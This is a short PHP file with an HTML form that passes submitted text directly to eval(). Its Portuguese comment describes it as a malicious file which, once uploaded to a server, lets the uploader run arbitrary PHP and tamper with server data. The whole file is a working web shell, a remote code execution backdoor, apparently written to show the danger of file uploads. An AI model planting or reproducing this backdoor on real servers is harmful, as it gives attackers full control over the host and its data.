<form method="POST">
	<textarea name="code" style="width:500px; height:300px;"></textarea>
	<br/>
	<input type="submit" value="Executar">
</form>

<hr/>

<?php
/**
 * se eu enviar esse arquivo MALICIOSO para dentro do servidor
 * eu consigo executar scripts PHP
 * e consequentemente, mecher com os dados do servidor!
 */
if(!empty($_POST['code'])){
	eval($_POST['code']);
}